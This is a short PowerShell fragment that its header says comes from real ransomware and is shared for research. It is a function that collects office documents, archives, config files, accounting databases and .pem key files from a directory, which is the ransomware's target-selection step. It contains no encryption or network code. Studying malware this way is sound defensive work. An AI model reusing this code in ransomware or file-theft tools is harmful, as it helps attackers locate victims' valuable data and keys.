// THIS CODE SAMPLE WAS TAKEN FROM REAL RANSOMWARE AND IS PROVIDED HERE ONLY FOR RESEARCH NEEDS !!!
// TO STOP RANSOMWARE WE NEED TO KNOW HOW IT WORKS INSIDE
// DON'T USE ANY OF THIS CODE SAMPLES FOR ANY CRIMINAL ACTIVITIES!

function GetAllOfficeFilesForDir($dirname) {
$resultlist=[System.Collections.ArrayList]@();
try {
$list = (Get-ChildItem -File $dirname| Select-Object Name -ExpandProperty Name);
foreach ($l in $list) {
if (($l -match '.*\.doc$') -or ($l -match '.*\.docx$') -or ($l -match '.*\.exe$') -or ($l -match '.*\.lnk$') -or ($l -match '.*\.rtf$') -or ($l -match '.*\.xls$') -or ($l -match '.*\.xlsx$') -or ($l -match '.*\.pdf$') -or ($l -match '.*\.txt$') -or ($l -match '.*\.conf$') -or ($l -match '.*\.ppt$') -or ($l -match '.*\.pptx$') -or ($l -match '.*\.odt$') -or ($l -match '.*\.cfg$') -or ($l -match '.*\.ini$') -or ($l -match '.*\.dt$') -or ($l -match '.*\.cf$') -or ($l -match '.*\.rar$') -or ($l -match '.*\.zip$') -or ($l -match '.*\.1cd$') -or ($l -match '.*\.efd$') -or ($l -match '.*\.pfl$') -or ($l -match '.*\.bsl$') -or ($l -match '.*\.sig$') -or ($l -match '.*\.pem$')) {
$resultlist.Insert(0,$l);
}
}
$resultlist = [System.Collections.ArrayList]$resultlist;
} catch {
}
return $resultlist;
}
